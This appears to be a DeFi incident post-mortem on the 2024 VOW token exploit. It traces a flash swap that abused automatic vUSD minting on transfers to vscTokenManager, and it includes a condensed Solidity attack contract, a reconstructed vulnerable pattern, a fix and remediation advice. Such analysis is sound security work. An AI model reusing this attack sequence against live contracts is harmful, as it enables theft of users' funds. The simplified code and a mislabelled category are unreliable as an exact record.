# VOW Token — Flash Swap and vscTokenManager Interaction Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-08-27 |
| **Protocol** | VOW Token |
| **Chain** | Ethereum |
| **Loss** | ~1,000,000 USD |
| **Attacker** | Address unidentified |
| **Attack Tx** | Block 20,519,309 |
| **Vulnerable Contract** | VOW-WETH Uniswap V2 Pair |
| **Root Cause** | Special logic activated on VOW→vscTokenManager transfer, enabling vUSD theft |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-08/VOW_exp.sol) |

---

## 1. Vulnerability Overview

The VOW token protocol was structured so that transferring VOW to vscTokenManager triggered special internal logic that minted vUSD. The attacker borrowed a large amount of VOW via a VOW-WETH flash swap, then transferred it to vscTokenManager to mint vUSD in bulk. They subsequently extracted additional profit from the vUSD-VOW pool, converted VOW to USDT and ETH, and drained approximately $1,000,000 in total.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: VOW transfer to vscTokenManager allows vUSD minting
function _transfer(address from, address to, uint256 amount) internal override {
    if (to == address(vscTokenManager)) {
        // ❌ VOW borrowed via flash loan can also be used to mint vUSD
        uint256 vusdAmount = calculateVusd(amount);
        IVscTokenManager(vscTokenManager).mintVusd(from, vusdAmount);
    }
    super._transfer(from, to, amount);
}

// ✅ Correct code: detect flash loan usage or apply time-weighted lock
function _transfer(address from, address to, uint256 amount) internal override {
    if (to == address(vscTokenManager)) {
        // ✅ Enforce minimum lock period
        require(block.timestamp >= lastReceived[from] + MIN_LOCK_PERIOD, "Lock period");
        uint256 vusdAmount = calculateVusd(amount);
        IVscTokenManager(vscTokenManager).mintVusd(from, vusdAmount);
    }
    super._transfer(from, to, amount);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► VOW-WETH pool flash swap (borrow large amount of VOW)
  │
  ├─[2]─► uniswapV2Call callback:
  │         ├─► VOW transferred to attacker
  │         └─► attacker transfers VOW to vscTokenManager
  │               └─► VOW transfer → bulk vUSD minted
  │
  ├─[3]─► Buy VOW with vUSD in vUSD-VOW pool (cross-pool arbitrage)
  │
  ├─[4]─► Swap additional VOW → USDT
  │
  ├─[5]─► Repay flash swap (amount * 3 / 997 + 1000)
  │
  └─[6]─► Total loss: ~1,000,000 USD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackContract {
    function testExploit() external {
        // [1] VOW-WETH flash swap
        IVOW_WETH_PAIR.swap(VOW_AMOUNT, 0, address(this), abi.encode("flash"));
    }

    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        // [2] Transfer VOW to vscTokenManager to mint vUSD
        IERC20(VOW).transfer(address(this), amount0);
        IERC20(VOW).transfer(vscTokenManager, amount0);
        // → vscTokenManager mints vUSD to attacker

        // [3] Realize profit in vUSD-VOW pool
        uint256 vusdBal = IERC20(vUSD).balanceOf(address(this));
        IVusdVowPair.swap(0, getAmountOut(vusdBal, vusdReserve, vowReserve), address(this), "");

        // [4] Swap additional VOW → USDT
        swapTokenToToken(VOW, USDT, IERC20(VOW).balanceOf(address(this)));

        // [5] Repay flash swap
        uint256 repayAmount = amount0 * 3 / 997 + 1000;
        IERC20(VOW).transfer(address(IVOW_WETH_PAIR), repayAmount);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Business Logic Error — transferring VOW tokens to `vscTokenManager` triggers an automatic vUSD minting logic, which can be exploited during a flash swap to obtain vUSD for free |
| **Attack Technique** | VOW→vscTokenManager Auto-Mint vUSD Exploit (flash swap serves as auxiliary funding mechanism) |
| **DASP Category** | Price Oracle Manipulation |
| **CWE** | CWE-840: Business Logic Errors |
| **Severity** | Critical |
| **Attack Complexity** | High |

## 6. Remediation Recommendations

1. **Flash Loan Detection**: Detect whether a large liquidity withdrawal occurred within the same block as the VOW transfer.
2. **vUSD Minting Lock**: Allow vUSD minting only after a minimum of 1–N blocks have elapsed since VOW was received.
3. **Maximum Minting Cap**: Limit the maximum amount of vUSD that can be minted in a single transaction.
4. **Cross-Pool Arbitrage Defense**: Monitor for simultaneous arbitrage across multiple pools connected to the protocol.

## 7. Lessons Learned

- **Side Effects on Token Transfer**: When a token transfer triggers internal state changes (vUSD minting), it becomes a flash loan attack vector.
- **Cross-Pool Complexity**: In complex token economies where multiple pools are interconnected, the interactions between each pool must be carefully analyzed.
- **$1M Scale**: Business logic vulnerabilities can also result in significant financial losses.